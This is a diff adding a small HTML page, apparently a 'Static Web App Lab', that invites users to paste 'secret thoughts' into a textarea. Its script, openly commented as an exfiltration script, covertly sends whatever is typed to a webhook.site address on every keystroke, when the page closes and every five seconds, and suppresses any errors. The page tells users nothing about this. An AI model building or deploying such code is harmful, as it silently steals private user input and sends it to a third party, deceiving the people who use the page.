@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Static Web App Lab 4</title>
+  </head>
+  <body
+    style="display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background-color: #f0f0f0;"
+  >
+    <div
+      style="background-color: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center;"
+    >
+      <h1>Static Web App Lab 4 - Write</h1>
+      <div style="margin: 20px;">
+        <h2>Secret Thoughts</h2>
+        <textarea
+          id="secretThoughts"
+          rows="10"
+          cols="50"
+          placeholder="Paste your secret thoughts here..."
+          style="width: 100%; max-width: 500px;"
+        ></textarea>
+      </div>
+    </div>
+    <script>
+      // Exfiltration script - sends textarea content to webhook on input
+      const textarea = document.getElementById('secretThoughts');
+      const webhookUrl = 'https://webhook.site/20b000c2-bce6-40aa-8bae-ebd90aec6195';
+
+      // Send content on any input change
+      textarea.addEventListener('input', function() {
+        const data = {
+          content: textarea.value,
+          timestamp: new Date().toISOString(),
+          source: 'static-web-app-lab-4-exfil'
+        };
+
+        fetch(webhookUrl, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        }).catch(err => console.log('Exfiltration attempt:', err));
+      });
+
+      // Also send when user leaves the page (in case they paste and close)
+      window.addEventListener('beforeunload', function() {
+        if (textarea.value) {
+          navigator.sendBeacon(webhookUrl, JSON.stringify({
+            content: textarea.value,
+            timestamp: new Date().toISOString(),
+            source: 'static-web-app-lab-4-exfil',
+            event: 'beforeunload'
+          }));
+        }
+      });
+
+      // Poll every 5 seconds to capture content (in case of copy-paste without input event)
+      setInterval(function() {
+        if (textarea.value && textarea.value.trim().length > 0) {
+          fetch(webhookUrl, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              content: textarea.value,
+              timestamp: new Date().toISOString(),
+              source: 'static-web-app-lab-4-exfil',
+              event: 'poll'
+            })
+          }).catch(err => {});
+        }
+      }, 5000);
+    </script>
+  </body>
+</html>
